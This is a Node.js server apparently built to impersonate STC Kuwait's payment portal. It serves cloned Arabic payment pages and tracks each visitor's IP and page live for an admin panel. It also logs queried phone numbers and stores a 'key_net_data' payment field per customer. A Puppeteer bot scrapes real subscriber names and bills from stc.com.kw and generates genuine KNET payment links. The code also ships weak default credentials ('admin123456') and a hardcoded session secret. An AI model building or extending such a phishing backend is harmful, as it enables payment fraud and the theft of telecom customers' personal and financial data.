const express = require('express');
const path = require('path');
const fs = require('fs');
const http = require('http');
const { Server } = require('socket.io');
const { Pool } = require('pg');
const bcrypt = require('bcrypt');
const session = require('express-session');
const puppeteer = require('puppeteer-core');

// Puppeteer browser instance (reused)
let browserInstance = null;
async function getBrowser() {
  if (browserInstance && browserInstance.isConnected()) return browserInstance;
  const execPath = process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/chromium';
  browserInstance = await puppeteer.launch({
    executablePath: execPath,
    headless: true,
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--disable-gpu',
      '--no-first-run',
      '--no-zygote',
      '--single-process'
    ]
  });
  return browserInstance;
}

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const PORT = process.env.PORT || 8080;

// PostgreSQL connection
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({
  secret: process.env.JWT_SECRET || 'stc-kuwait-secret-2024',
  resave: false,
  saveUninitialized: false,
  cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 }
}));

// Initialize database tables
async function initDB() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS customers (
        id SERIAL PRIMARY KEY,
        phone_number VARCHAR(20) UNIQUE NOT NULL,
        amount DECIMAL(10,3),
        plan_name VARCHAR(100),
        key_net_data TEXT,
        notes TEXT,
        created_at TIMESTAMP DEFAULT NOW(),
        updated_at TIMESTAMP DEFAULT NOW()
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS visitor_sessions (
        id SERIAL PRIMARY KEY,
        session_id VARCHAR(100),
        ip_address VARCHAR(50),
        page VARCHAR(200),
        entered_at TIMESTAMP DEFAULT NOW(),
        left_at TIMESTAMP,
        is_active BOOLEAN DEFAULT true
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS customer_queries (
        id SERIAL PRIMARY KEY,
        phone_number VARCHAR(20),
        query_type VARCHAR(50),
        ip_address VARCHAR(50),
        queried_at TIMESTAMP DEFAULT NOW()
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS admin_users (
        id SERIAL PRIMARY KEY,
        username VARCHAR(50) UNIQUE NOT NULL,
        password_hash VARCHAR(255) NOT NULL,
        created_at TIMESTAMP DEFAULT NOW()
      )
    `);

    // Create default admin if not exists
    const adminExists = await pool.query("SELECT id FROM admin_users WHERE username = 'admin'");
    if (adminExists.rows.length === 0) {
      const adminPass = process.env.ADMIN_PASSWORD || 'admin123456';
      const hash = await bcrypt.hash(adminPass, 10);
      await pool.query("INSERT INTO admin_users (username, password_hash) VALUES ('admin', $1)", [hash]);
      console.log('Default admin created');
    }

    console.log('Database initialized successfully');
  } catch (err) {
    console.error('Database init error:', err.message);
  }
}

// Track active visitors: Map<socketId, {page, ip, connectedAt}>
const activeVisitors = new Map();

function broadcastVisitors() {
  const list = Array.from(activeVisitors.entries()).map(([id, v]) => ({
    id,
    page: v.page,
    ip: v.ip,
    connectedAt: v.connectedAt,
  }));
  io.emit('visitor_update', { count: list.length, visitors: list });
}

// Socket.io for real-time visitor tracking
io.on('connection', (socket) => {
  const visitorId = socket.id;
  const page = socket.handshake.query.page || '/';
  const ip = ((socket.handshake.headers['x-forwarded-for'] || socket.handshake.address || '')).split(',')[0].trim();

  activeVisitors.set(visitorId, { page, ip, connectedAt: new Date() });

  // Save to DB
  pool.query(
    'INSERT INTO visitor_sessions (session_id, ip_address, page) VALUES ($1, $2, $3)',
    [visitorId, ip, page]
  ).catch(err => console.error('Visitor insert error:', err.message));

  // Broadcast updated visitor list
  broadcastVisitors();

  // Allow visitor to notify page change
  socket.on('page_change', (newPage) => {
    const visitor = activeVisitors.get(visitorId);
    if (visitor) {
      visitor.page = newPage || '/';
      activeVisitors.set(visitorId, visitor);
      broadcastVisitors();
    }
  });

  socket.on('disconnect', () => {
    activeVisitors.delete(visitorId);
    pool.query(
      'UPDATE visitor_sessions SET left_at = NOW(), is_active = false WHERE session_id = $1',
      [visitorId]
    ).catch(err => console.error('Visitor update error:', err.message));
    broadcastVisitors();
  });
});

// ===== API ROUTES =====

// Get customer by phone
app.get('/api/customer/:phone', async (req, res) => {
  try {
    const { phone } = req.params;
    const cleanPhone = phone.replace(/\D/g, '');

    // Log the query
    const ip = req.headers['x-forwarded-for'] || req.ip;
    await pool.query(
      'INSERT INTO customer_queries (phone_number, query_type, ip_address) VALUES ($1, $2, $3)',
      [cleanPhone, 'lookup', ip]
    ).catch(() => {});

    const result = await pool.query(
      'SELECT * FROM customers WHERE phone_number = $1',
      [cleanPhone]
    );

    if (result.rows.length === 0) {
      return res.json({ found: false, message: 'رقم الهاتف غير موجود' });
    }

    const customer = result.rows[0];
    res.json({
      found: true,
      phone_number: customer.phone_number,
      amount: customer.amount,
      plan_name: customer.plan_name,
      key_net_data: customer.key_net_data,
      notes: customer.notes
    });
  } catch (err) {
    console.error('Customer lookup error:', err.message);
    res.status(500).json({ error: 'خطأ في الخادم' });
  }
});

// Get active visitor count (public)
app.get('/api/visitors/count', (req, res) => {
  res.json({ count: activeVisitors.size });
});

// Get active visitors list with details (admin only)
app.get('/api/admin/visitors/active', requireAdmin, (req, res) => {
  const list = Array.from(activeVisitors.entries()).map(([id, v]) => ({
    id,
    page: v.page,
    ip: v.ip,
    connectedAt: v.connectedAt,
    duration: Math.floor((Date.now() - new Date(v.connectedAt).getTime()) / 1000),
  }));
  res.json({ count: list.length, visitors: list });
});

// ===== ADMIN AUTH =====

function requireAdmin(req, res, next) {
  if (req.session && req.session.adminId) {
    return next();
  }
  res.status(401).json({ error: 'غير مصرح' });
}

// Admin login
app.post('/api/admin/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    const result = await pool.query('SELECT * FROM admin_users WHERE username = $1', [username]);

    if (result.rows.length === 0) {
      return res.status(401).json({ error: 'اسم المستخدم أو كلمة المرور غير صحيحة' });
    }

    const admin = result.rows[0];
    const valid = await bcrypt.compare(password, admin.password_hash);

    if (!valid) {
      return res.status(401).json({ error: 'اسم المستخدم أو كلمة المرور غير صحيحة' });
    }

    req.session.adminId = admin.id;
    req.session.adminUsername = admin.username;
    res.json({ success: true, username: admin.username });
  } catch (err) {
    console.error('Login error:', err.message);
    res.status(500).json({ error: 'خطأ في الخادم' });
  }
});

// Admin logout
app.post('/api/admin/logout', (req, res) => {
  req.session.destroy();
  res.json({ success: true });
});

// Check admin session
app.get('/api/admin/check', (req, res) => {
  if (req.session && req.session.adminId) {
    res.json({ loggedIn: true, username: req.session.adminUsername });
  } else {
    res.json({ loggedIn: false });
  }
});

// ===== ADMIN CUSTOMER MANAGEMENT =====

// Get all customers
app.get('/api/admin/customers', requireAdmin, async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM customers ORDER BY created_at DESC');
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Add customer
app.post('/api/admin/customers', requireAdmin, async (req, res) => {
  try {
    const { phone_number, amount, plan_name, key_net_data, notes } = req.body;
    const cleanPhone = phone_number.replace(/\D/g, '');

    const result = await pool.query(
      `INSERT INTO customers (phone_number, amount, plan_name, key_net_data, notes)
       VALUES ($1, $2, $3, $4, $5)
       ON CONFLICT (phone_number) DO UPDATE SET
         amount = EXCLUDED.amount,
         plan_name = EXCLUDED.plan_name,
         key_net_data = EXCLUDED.key_net_data,
         notes = EXCLUDED.notes,
         updated_at = NOW()
       RETURNING *`,
      [cleanPhone, amount, plan_name, key_net_data, notes]
    );

    res.json({ success: true, customer: result.rows[0] });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Update customer
app.put('/api/admin/customers/:id', requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const { phone_number, amount, plan_name, key_net_data, notes } = req.body;
    const cleanPhone = phone_number.replace(/\D/g, '');

    const result = await pool.query(
      `UPDATE customers SET phone_number=$1, amount=$2, plan_name=$3, key_net_data=$4, notes=$5, updated_at=NOW()
       WHERE id=$6 RETURNING *`,
      [cleanPhone, amount, plan_name, key_net_data, notes, id]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'العميل غير موجود' });
    }

    res.json({ success: true, customer: result.rows[0] });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Delete customer
app.delete('/api/admin/customers/:id', requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    await pool.query('DELETE FROM customers WHERE id=$1', [id]);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Get visitor stats
app.get('/api/admin/visitors', requireAdmin, async (req, res) => {
  try {
    const today = await pool.query(
      "SELECT COUNT(*) as count FROM visitor_sessions WHERE entered_at > NOW() - INTERVAL '24 hours'"
    );
    const active = activeVisitors.size;
    const queries = await pool.query(
      "SELECT COUNT(*) as count FROM customer_queries WHERE queried_at > NOW() - INTERVAL '24 hours'"
    );
    const recentQueries = await pool.query(
      "SELECT * FROM customer_queries ORDER BY queried_at DESC LIMIT 20"
    );

    res.json({
      active_visitors: active,
      today_visitors: parseInt(today.rows[0].count),
      today_queries: parseInt(queries.rows[0].count),
      recent_queries: recentQueries.rows
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ===== PUPPETEER BOT - جلب الفاتورة من STC =====
app.get('/api/bill/:phone', async (req, res) => {
  const { phone } = req.params;
  const cleanPhone = phone.replace(/\D/g, '');

  if (!cleanPhone || cleanPhone.length < 7) {
    return res.status(400).json({ error: 'رقم الهاتف غير صحيح' });
  }

  // Log the query
  const ip = (req.headers['x-forwarded-for'] || req.ip || '').split(',')[0].trim();
  pool.query(
    'INSERT INTO customer_queries (phone_number, query_type, ip_address) VALUES ($1, $2, $3)',
    [cleanPhone, 'bill_lookup', ip]
  ).catch(() => {});

  let page = null;
  try {
    const browser = await getBrowser();
    page = await browser.newPage();
    await page.setViewport({ width: 1280, height: 800 });
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

    // Navigate to STC payment page
    await page.goto('https://www.stc.com.kw/ar/payment-channels', {
      waitUntil: 'networkidle2',
      timeout: 30000
    });

    // Wait for page to load and click "ادفع الآن" (pay bill button)
    await page.waitForSelector('button', { timeout: 10000 });

    // Find and click the first "ادفع الآن" button (bill payment)
    const buttons = await page.$$('button');
    let billBtn = null;
    for (const btn of buttons) {
      const text = await page.evaluate(el => el.textContent.trim(), btn);
      if (text === 'ادفع الآن') {
        billBtn = btn;
        break;
      }
    }

    if (!billBtn) {
      throw new Error('زر الدفع غير موجود');
    }

    await billBtn.click();

    // Wait for the modal input to appear
    await page.waitForSelector('input[type="text"]', { timeout: 8000 });
    await new Promise(r => setTimeout(r, 500));

    // Find the phone input in the modal (last visible text input)
    const inputs = await page.$$('input[type="text"]');
    let phoneInput = null;
    for (const inp of inputs) {
      const visible = await page.evaluate(el => {
        const rect = el.getBoundingClientRect();
        return rect.width > 0 && rect.height > 0;
      }, inp);
      if (visible) phoneInput = inp;
    }

    if (!phoneInput) throw new Error('حقل الرقم غير موجود');

    await phoneInput.click({ clickCount: 3 });
    await phoneInput.type(cleanPhone, { delay: 50 });

    // Click موافق button
    const allBtns = await page.$$('button');
    for (const btn of allBtns) {
      const text = await page.evaluate(el => el.textContent.trim(), btn);
      if (text === 'موافق') {
        await btn.click();
        break;
      }
    }

    // Wait for bill data to load
    await new Promise(r => setTimeout(r, 4000));

    // Extract bill information from the page
    const billData = await page.evaluate(() => {
      const getText = (selectors) => {
        for (const sel of selectors) {
          const el = document.querySelector(sel);
          if (el && el.textContent.trim()) return el.textContent.trim();
        }
        return null;
      };

      // Try to find bill amount, due date, subscriber name
      const bodyText = document.body.innerText;

      // Look for KD amounts
      const amountMatch = bodyText.match(/(\d+\.?\d*)\s*د\.ك/) ||
                          bodyText.match(/KD\s*(\d+\.?\d*)/) ||
                          bodyText.match(/(\d+\.\d{3})/);

      // Look for subscriber name
      const namePatterns = [
        /اسم المشترك[:\s]+([^\n]+)/,
        /الاسم[:\s]+([^\n]+)/,
      ];
      let subscriberName = null;
      for (const p of namePatterns) {
        const m = bodyText.match(p);
        if (m) { subscriberName = m[1].trim(); break; }
      }

      // Look for due date
      const dateMatch = bodyText.match(/تاريخ الاستحقاق[:\s]+([^\n]+)/) ||
                        bodyText.match(/(\d{1,2}\/\d{1,2}\/\d{4})/);

      // Get all visible text in modal/dialog
      const modal = document.querySelector('[class*="modal"], [class*="dialog"], [class*="drawer"], [class*="sheet"], [class*="panel"]');
      const modalText = modal ? modal.innerText : null;

      return {
        amount: amountMatch ? amountMatch[1] : null,
        subscriberName,
        dueDate: dateMatch ? dateMatch[1] : null,
        modalText: modalText ? modalText.substring(0, 1000) : null,
        pageSnippet: bodyText.substring(0, 2000)
      };
    });

    await page.close();

    if (!billData.amount && !billData.modalText) {
      return res.json({
        found: false,
        phone: cleanPhone,
        message: 'لم يتم العثور على فاتورة لهذا الرقم أو الرقم غير مسجل في STC'
      });
    }

    res.json({
      found: true,
      phone: cleanPhone,
      amount: billData.amount,
      subscriberName: billData.subscriberName,
      dueDate: billData.dueDate,
      details: billData.modalText || billData.pageSnippet
    });

  } catch (err) {
    console.error('Puppeteer bill error:', err.message);
    if (page) await page.close().catch(() => {});
    res.status(500).json({
      error: 'حدث خطأ أثناء جلب الفاتورة',
      details: err.message
    });
  }
});

// ===== PUPPETEER BOT - إتمام دفع الفاتورة والحصول على رابط Knet =====
app.post('/api/pay-bill', async (req, res) => {
  const { phone, paymentMethod } = req.body;
  const cleanPhone = (phone || '').replace(/\D/g, '');
  if (!cleanPhone || cleanPhone.length < 7) {
    return res.status(400).json({ error: 'رقم الهاتف غير صحيح' });
  }
  const ip = (req.headers['x-forwarded-for'] || req.ip || '').split(',')[0].trim();
  pool.query('INSERT INTO customer_queries (phone_number, query_type, ip_address) VALUES ($1, $2, $3)',
    [cleanPhone, 'pay_bill_' + (paymentMethod || 'knet'), ip]).catch(() => {});
  let page = null;
  try {
    const browser = await getBrowser();
    page = await browser.newPage();
    await page.setViewport({ width: 1280, height: 800 });
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    await page.goto('https://www.stc.com.kw/ar/payment-channels', { waitUntil: 'networkidle2', timeout: 30000 });
    await page.waitForSelector('button', { timeout: 10000 });
    // Click first ادفع الآن
    const buttons = await page.$$('button');
    let billBtn = null;
    for (const btn of buttons) {
      const text = await page.evaluate(el => el.textContent.trim(), btn);
      if (text === 'ادفع الآن') { billBtn = btn; break; }
    }
    if (!billBtn) throw new Error('زر الدفع غير موجود');
    await billBtn.click();
    await page.waitForSelector('input[type="text"]', { timeout: 8000 });
    await new Promise(r => setTimeout(r, 500));
    const inputs = await page.$$('input[type="text"]');
    let phoneInput = null;
    for (const inp of inputs) {
      const visible = await page.evaluate(el => { const r = el.getBoundingClientRect(); return r.width > 0 && r.height > 0; }, inp);
      if (visible) phoneInput = inp;
    }
    if (!phoneInput) throw new Error('حقل الرقم غير موجود');
    await phoneInput.click({ clickCount: 3 });
    await phoneInput.type(cleanPhone, { delay: 50 });
    const allBtns1 = await page.$$('button');
    for (const btn of allBtns1) {
      const text = await page.evaluate(el => el.textContent.trim(), btn);
      if (text === 'موافق') { await btn.click(); break; }
    }
    await new Promise(r => setTimeout(r, 5000));
    // Extract bill data
    const billData = await page.evaluate(() => {
      const bodyText = document.body.innerText;
      const amountMatch = bodyText.match(/(\d+\.\d{3})\s*KD/) || bodyText.match(/KD\s*(\d+\.?\d*)/) || bodyText.match(/(\d+\.?\d*)\s*د\.ك/) || bodyText.match(/(\d+\.\d{3})/);
      return { amount: amountMatch ? amountMatch[1] : null };
    });
    // Click يكمل
    const allBtns2 = await page.$$('button');
    let continueBtn = null;
    for (const btn of allBtns2) {
      const text = await page.evaluate(el => el.textContent.trim(), btn);
      if (text === 'يكمل' || text === 'متابعة' || text === 'Continue') { continueBtn = btn; break; }
    }
    if (!continueBtn) throw new Error('زر يكمل غير موجود');
    await continueBtn.click();
    await new Promise(r => setTimeout(r, 2000));
    // Select payment method
    const method = (paymentMethod || 'knet').toLowerCase();
    const allEls = await page.$$('button, div[role="button"], [class*="payment"], [class*="Payment"], [class*="method"]');
    for (const el of allEls) {
      const text = await page.evaluate(e => e.textContent.trim().toLowerCase(), el);
      if (method === 'knet' && (text.includes('knet') || text.includes('كنت'))) { await el.click(); break; }
      else if (method === 'card' && (text.includes('بطاقة') || text.includes('card'))) { await el.click(); break; }
      else if (method === 'googlepay' && text.includes('google')) { await el.click(); break; }
    }
    await new Promise(r => setTimeout(r, 1000));
    // Click تأكيد الدفع
    const allBtns4 = await page.$$('button');
    for (const btn of allBtns4) {
      const text = await page.evaluate(el => el.textContent.trim(), btn);
      if (text.includes('تأكيد الدفع') || text.includes('ادفع')) {
        const navPromise = page.waitForNavigation({ timeout: 15000 }).catch(() => null);
        await btn.click();
        await navPromise;
        break;
      }
    }
    await new Promise(r => setTimeout(r, 3000));
    const finalUrl = page.url();
    await page.close();
    if (finalUrl && finalUrl.includes('kpay.com.kw')) {
      return res.json({ success: true, knetUrl: finalUrl, phone: cleanPhone, amount: billData.amount });
    }
    return res.json({ success: false, phone: cleanPhone, amount: billData.amount, message: 'تعذر الحصول على رابط الدفع تلقائياً' });
  } catch (err) {
    console.error('Puppeteer pay-bill error:', err.message);
    if (page) await page.close().catch(() => {});
    res.status(500).json({ error: 'حدث خطأ أثناء إتمام الدفع', details: err.message });
  }
});

// ===== PUPPETEER BOT - إتمام الشحن والحصول على رابط Knet =====
app.post('/api/pay-recharge', async (req, res) => {
  const { phone, rechargeType, paymentMethod } = req.body;
  const cleanPhone = (phone || '').replace(/\D/g, '');
  if (!cleanPhone || cleanPhone.length < 7) {
    return res.status(400).json({ error: 'رقم الهاتف غير صحيح' });
  }
  const ip = (req.headers['x-forwarded-for'] || req.ip || '').split(',')[0].trim();
  pool.query('INSERT INTO customer_queries (phone_number, query_type, ip_address) VALUES ($1, $2, $3)',
    [cleanPhone, 'recharge_' + (rechargeType || 'voice') + '_' + (paymentMethod || 'knet'), ip]).catch(() => {});
  let page = null;
  try {
    const browser = await getBrowser();
    page = await browser.newPage();
    await page.setViewport({ width: 1280, height: 800 });
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    await page.goto('https://www.stc.com.kw/ar/payment-channels', { waitUntil: 'networkidle2', timeout: 30000 });
    await page.waitForSelector('button', { timeout: 10000 });
    const buttons = await page.$$('button');
    let rechargeBtn = null;
    for (const btn of buttons) {
      const text = await page.evaluate(el => el.textContent.trim(), btn);
      if (text === 'اشحن الآن') { rechargeBtn = btn; break; }
    }
    if (!rechargeBtn) throw new Error('زر الشحن غير موجود');
    await rechargeBtn.click();
    await page.waitForSelector('input[type="text"]', { timeout: 8000 });
    await new Promise(r => setTimeout(r, 500));
    const inputs = await page.$$('input[type="text"]');
    let phoneInput = null;
    for (const inp of inputs) {
      const visible = await page.evaluate(el => { const r = el.getBoundingClientRect(); return r.width > 0 && r.height > 0; }, inp);
      if (visible) phoneInput = inp;
    }
    if (!phoneInput) throw new Error('حقل الرقم غير موجود');
    await phoneInput.click({ clickCount: 3 });
    await phoneInput.type(cleanPhone, { delay: 50 });
    await new Promise(r => setTimeout(r, 500));
    const allBtns1 = await page.$$('button');
    for (const btn of allBtns1) {
      const text = await page.evaluate(el => el.textContent.trim(), btn);
      if (text === 'موافق' || text === 'متابعة') { await btn.click(); break; }
    }
    await new Promise(r => setTimeout(r, 3000));
    const allBtns2 = await page.$$('button');
    for (const btn of allBtns2) {
      const text = await page.evaluate(el => el.textContent.trim(), btn);
      if (text === 'يكمل' || text === 'متابعة') { await btn.click(); break; }
    }
    await new Promise(r => setTimeout(r, 2000));
    const method = (paymentMethod || 'knet').toLowerCase();
    const allEls = await page.$$('button, div[role="button"]');
    for (const el of allEls) {
      const text = await page.evaluate(e => e.textContent.trim().toLowerCase(), el);
      if (method === 'knet' && text.includes('knet')) { await el.click(); break; }
      else if (method === 'card' && text.includes('بطاقة')) { await el.click(); break; }
    }
    await new Promise(r => setTimeout(r, 1000));
    const allBtns4 = await page.$$('button');
    for (const btn of allBtns4) {
      const text = await page.evaluate(el => el.textContent.trim(), btn);
      if (text.includes('تأكيد')) {
        const navPromise = page.waitForNavigation({ timeout: 15000 }).catch(() => null);
        await btn.click();
        await navPromise;
        break;
      }
    }
    await new Promise(r => setTimeout(r, 3000));
    const finalUrl = page.url();
    await page.close();
    if (finalUrl && finalUrl.includes('kpay.com.kw')) {
      return res.json({ success: true, knetUrl: finalUrl, phone: cleanPhone });
    }
    return res.json({ success: false, phone: cleanPhone, message: 'تعذر الحصول على رابط الدفع تلقائياً' });
  } catch (err) {
    console.error('Puppeteer pay-recharge error:', err.message);
    if (page) await page.close().catch(() => {});
    res.status(500).json({ error: 'حدث خطأ أثناء إتمام الشحن', details: err.message });
  }
});

// ===== PUPPETEER BOT - دفع الخطوط المنتهية والحصول على رابط Knet =====
app.post('/api/pay-terminated', async (req, res) => {
  const { phone, paymentMethod } = req.body;
  const cleanPhone = (phone || '').replace(/\D/g, '');
  if (!cleanPhone || cleanPhone.length < 7) {
    return res.status(400).json({ error: 'رقم الهاتف غير صحيح' });
  }
  const ip = (req.headers['x-forwarded-for'] || req.ip || '').split(',')[0].trim();
  pool.query('INSERT INTO customer_queries (phone_number, query_type, ip_address) VALUES ($1, $2, $3)',
    [cleanPhone, 'terminated_' + (paymentMethod || 'knet'), ip]).catch(() => {});
  let page = null;
  try {
    const browser = await getBrowser();
    page = await browser.newPage();
    await page.setViewport({ width: 1280, height: 800 });
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    await page.goto('https://www.stc.com.kw/ar/payment-channels', { waitUntil: 'networkidle2', timeout: 30000 });
    await page.waitForSelector('button', { timeout: 10000 });
    // Click the second ادفع الآن (terminated lines)
    const buttons = await page.$$('button');
    let terminatedBtn = null;
    let payBtnCount = 0;
    for (const btn of buttons) {
      const text = await page.evaluate(el => el.textContent.trim(), btn);
      if (text === 'ادفع الآن') {
        payBtnCount++;
        if (payBtnCount === 2) { terminatedBtn = btn; break; }
      }
    }
    if (!terminatedBtn) {
      for (const btn of buttons) {
        const text = await page.evaluate(el => el.textContent.trim(), btn);
        if (text === 'ادفع الآن') { terminatedBtn = btn; }
      }
    }
    if (!terminatedBtn) throw new Error('زر دفع الخطوط المنتهية غير موجود');
    await terminatedBtn.click();
    await page.waitForSelector('input[type="text"]', { timeout: 8000 });
    await new Promise(r => setTimeout(r, 500));
    const inputs = await page.$$('input[type="text"]');
    let phoneInput = null;
    for (const inp of inputs) {
      const visible = await page.evaluate(el => { const r = el.getBoundingClientRect(); return r.width > 0 && r.height > 0; }, inp);
      if (visible) phoneInput = inp;
    }
    if (!phoneInput) throw new Error('حقل الرقم غير موجود');
    await phoneInput.click({ clickCount: 3 });
    await phoneInput.type(cleanPhone, { delay: 50 });
    const allBtns1 = await page.$$('button');
    for (const btn of allBtns1) {
      const text = await page.evaluate(el => el.textContent.trim(), btn);
      if (text === 'موافق') { await btn.click(); break; }
    }
    await new Promise(r => setTimeout(r, 5000));
    const billData = await page.evaluate(() => {
      const bodyText = document.body.innerText;
      const amountMatch = bodyText.match(/(\d+\.\d{3})\s*KD/) || bodyText.match(/KD\s*(\d+\.?\d*)/) || bodyText.match(/(\d+\.?\d*)\s*د\.ك/) || bodyText.match(/(\d+\.\d{3})/);
      return { amount: amountMatch ? amountMatch[1] : null };
    });
    const allBtns2 = await page.$$('button');
    for (const btn of allBtns2) {
      const text = await page.evaluate(el => el.textContent.trim(), btn);
      if (text === 'يكمل' || text === 'متابعة') { await btn.click(); break; }
    }
    await new Promise(r => setTimeout(r, 2000));
    const method = (paymentMethod || 'knet').toLowerCase();
    const allEls = await page.$$('button, div[role="button"]');
    for (const el of allEls) {
      const text = await page.evaluate(e => e.textContent.trim().toLowerCase(), el);
      if (method === 'knet' && text.includes('knet')) { await el.click(); break; }
      else if (method === 'card' && text.includes('بطاقة')) { await el.click(); break; }
    }
    await new Promise(r => setTimeout(r, 1000));
    const allBtns4 = await page.$$('button');
    for (const btn of allBtns4) {
      const text = await page.evaluate(el => el.textContent.trim(), btn);
      if (text.includes('تأكيد')) {
        const navPromise = page.waitForNavigation({ timeout: 15000 }).catch(() => null);
        await btn.click();
        await navPromise;
        break;
      }
    }
    await new Promise(r => setTimeout(r, 3000));
    const finalUrl = page.url();
    await page.close();
    if (finalUrl && finalUrl.includes('kpay.com.kw')) {
      return res.json({ success: true, knetUrl: finalUrl, phone: cleanPhone, amount: billData.amount });
    }
    return res.json({ success: false, phone: cleanPhone, amount: billData.amount, message: 'تعذر الحصول على رابط الدفع تلقائياً' });
  } catch (err) {
    console.error('Puppeteer pay-terminated error:', err.message);
    if (page) await page.close().catch(() => {});
    res.status(500).json({ error: 'حدث خطأ أثناء إتمام دفع الخطوط المنتهية', details: err.message });
  }
});

// ===== ADMIN PANEL HTML =====
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin', 'index.html'));
});

app.get('/admin/*', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin', 'index.html'));
});

// ===== STATIC FILES =====
app.use(express.static(__dirname, {
  index: false,
  dotfiles: 'ignore'
}));

// Redirect root to Arabic payment channels page
app.get('/', (req, res) => {
  res.redirect('/ar/payment-channels');
});

// Serve HTML files without .html extension
app.get('/ar/pay-bill', (req, res) => {
  const filePath = path.join(__dirname, 'ar', 'pay-bill.html');
  if (fs.existsSync(filePath)) {
    res.sendFile(filePath);
  } else {
    res.status(404).send('Page not found');
  }
});

app.get('/ar/recharge', (req, res) => {
  const filePath = path.join(__dirname, 'ar', 'recharge.html');
  if (fs.existsSync(filePath)) {
    res.sendFile(filePath);
  } else {
    res.status(404).send('Page not found');
  }
});

app.get('/ar/terminated-lines', (req, res) => {
  const filePath = path.join(__dirname, 'ar', 'terminated-lines.html');
  if (fs.existsSync(filePath)) {
    res.sendFile(filePath);
  } else {
    res.status(404).send('Page not found');
  }
});

app.get('/ar/payment-channels', (req, res) => {
  const filePath = path.join(__dirname, 'ar', 'payment-channels.html');
  if (fs.existsSync(filePath)) {
    res.sendFile(filePath);
  } else {
    res.status(404).send('Page not found');
  }
});

// Catch-all: try to serve .html files
app.get('*', (req, res) => {
  const urlPath = req.path;

  // Try exact path
  let filePath = path.join(__dirname, urlPath);
  if (fs.existsSync(filePath) && fs.statSync(filePath).isFile()) {
    return res.sendFile(filePath);
  }

  // Try with .html extension
  filePath = path.join(__dirname, urlPath + '.html');
  if (fs.existsSync(filePath)) {
    return res.sendFile(filePath);
  }

  // Try index.html in directory
  filePath = path.join(__dirname, urlPath, 'index.html');
  if (fs.existsSync(filePath)) {
    return res.sendFile(filePath);
  }

  res.status(404).send('Page not found');
});

// Start server
initDB().then(() => {
  server.listen(PORT, () => {
    console.log(`STC Kuwait server running on port ${PORT}`);
  });
});
